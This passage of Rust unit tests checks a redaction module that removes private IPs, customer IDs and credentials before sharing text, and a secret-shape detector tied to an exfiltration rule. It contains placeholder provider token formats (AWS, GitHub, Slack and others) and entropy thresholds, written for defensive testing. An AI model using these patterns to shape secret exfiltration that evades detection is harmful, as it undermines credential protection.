        assert!(report.redacted_content.contains("10.0.0.1"));
    }

    #[test]
    fn private_ipv4_on_own_line_is_redacted() {
        let input = "the host is below:\n  10.0.0.5\nand it responds quickly.\n";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(!report.redacted_content.contains("10.0.0.5"));
        assert!(report.redactions.iter().any(|r| r.label == "private_ipv4"));
    }

    #[test]
    fn private_ipv4_multibyte_preceding_chars_do_not_panic() {
        // Regression (code-reviewer Critical-2): `saturating_sub(20)` could land
        // mid-multibyte, panicking on the slice. Snapping to a char boundary
        // avoids it.
        let input = "日日日日日日日10.0.0.5"; // 7×3 + 9 = 30 bytes, IP starts at 21
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        // Must not panic; no context fires, so the IP is left alone.
        let _ = report.total();
    }

    #[test]
    fn private_ipv4_no_redact_for_public_dns_in_keyword_context() {
        // Public DNS IPs must NOT be redacted even with a keyword prefix — the
        // heuristic is gated on the RFC1918 regex, not the keyword alone.
        let input = "server 1.1.1.1 returned a response\nhost 8.8.8.8 too\n";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(report.redacted_content.contains("1.1.1.1"));
        assert!(report.redacted_content.contains("8.8.8.8"));
    }

    #[test]
    fn private_ipv4_redacts_with_keyword_in_window() {
        let input = "server 10.0.0.5 timed out";
        let report = redact_for_audience(input, ShareAudience::PublicPaste);
        assert!(!report.redacted_content.contains("10.0.0.5"));
        assert!(report.redactions.iter().any(|r| r.label == "private_ipv4"));
    }

    #[test]
    fn audience_llm_does_not_redact_private_ip_or_hostname() {
        // LLM audience preserves everything except credentials.
        let input = "server 10.0.0.5 timed out at /home/alice/repo/foo.rs line 12\n";
        let report = redact_for_audience(input, ShareAudience::Llm);
        assert!(report.redacted_content.contains("10.0.0.5"));
        assert!(report.redacted_content.contains("/home/alice"));
        assert!(report.redactions.is_empty(), "no secrets, no redactions");
    }

    #[test]
    fn customer_id_patterns_are_redacted_and_counted_under_one_label() {
        // Two patterns collapse to one `customer_id` label (count aggregates).
        let input = "customer CUST-12345 escalated; ref ACME-99887.";
        let patterns = vec![r"CUST-\d+".to_string(), r"ACME-\d+".to_string()];
        let report = redact_for_audience_with_custom(input, ShareAudience::Slack, &patterns);
        assert!(!report.redacted_content.contains("CUST-12345"));
        assert!(!report.redacted_content.contains("ACME-99887"));
        let cust = report
            .redactions
            .iter()
            .find(|r| r.label == "customer_id")
            .expect("expected customer_id row");
        assert_eq!(cust.count, 2);
    }

    #[test]
    fn share_audience_parse_cli_round_trips() {
        for tok in ShareAudience::cli_values() {
            assert!(
                ShareAudience::parse_cli(tok).is_some(),
                "advertised CLI value {tok:?} must parse"
            );
        }
        assert!(ShareAudience::parse_cli("not-a-real-audience").is_none());
    }

    #[test]
    fn redact_report_total_sums_counts() {
        let aws_key = "AKIAIOSFODNN7EXAMPLE";
        let input = format!("k1={aws_key}\nk2={aws_key}\n");
        let report = redact_for_audience(&input, ShareAudience::Slack);
        // Sum across all labels.
        assert!(report.total() >= 2);
    }

    #[test]
    fn looks_secret_shaped_matches_provider_tokens() {
        // The narrow provider subset fires on a bare credential value.
        assert!(looks_secret_shaped("AKIAIOSFODNN7EXAMPLE"));
        assert!(looks_secret_shaped(concat!(
            "sk-",
            "abcdefghijklmnopqrstuvwxyz123456"
        )));
        assert!(looks_secret_shaped(concat!(
            "gh",
            "p_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl"
        )));
        assert!(looks_secret_shaped(concat!(
            "sk-ant-",
            "api03-abcdefghijklmnopqrst"
        )));
        assert!(looks_secret_shaped("xoxb-1234567890-abcdefghij"));
    }

    #[test]
    fn looks_secret_shaped_excludes_email_and_ordinary_values() {
        // The whole point of the narrow set: an email must NOT look secret-shaped,
        // so `?email=foo@bar.com` never fires the exfil secret-in-query rule.
        assert!(!looks_secret_shaped("user@example.com"));
        assert!(!looks_secret_shaped("foo.bar+tag@sub.example.co.uk"));
        // Ordinary query values.
        assert!(!looks_secret_shaped("2"));
        assert!(!looks_secret_shaped("hello"));
        assert!(!looks_secret_shaped("page-2"));
        // The provider patterns are anchored: a SHORT junk-glued token (too short
        // to be caught by the generic high-entropy arm) is not a clean match.
        assert!(!looks_secret_shaped("junkAKIA12"));
        assert!(!looks_secret_shaped("see-sk-here"));
    }

    #[test]
    fn looks_secret_shaped_generic_opaque_token_gated_on_entropy() {
        // A long mixed-case/digit opaque token (entropy well above 4.0 bits/char)
        // matches the generic arm.
        let opaque = "aB3xK9mP2qR7tV1wY5zC4dF8gH6jL0nQ_sT-uW2xZ4bN8kM";
        assert!(looks_secret_shaped(opaque));
        // A 32+-char LOW-entropy run (repeated char / one repeated word) does NOT:
        // length alone is not enough, so a long benign slug is safe.
        assert!(!looks_secret_shaped(&"a".repeat(40)));
        assert!(!looks_secret_shaped(&"ab".repeat(20)));
        // Just under the length floor never matches the generic arm.
        assert!(!looks_secret_shaped("a1b2c3d4e5f60718293a4b5c6d7e8f9")); // 31 chars
    }

    #[test]
    fn audience_redaction_emits_stable_label_for_aws_in_json() {
        // Pin the stable snake_case label `--json` relies on.
        let input = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n";
        let report = redact_for_audience(input, ShareAudience::Llm);
        assert!(report
            .redactions
            .iter()
            .any(|r| r.label == "aws_access_key"));
    }
}
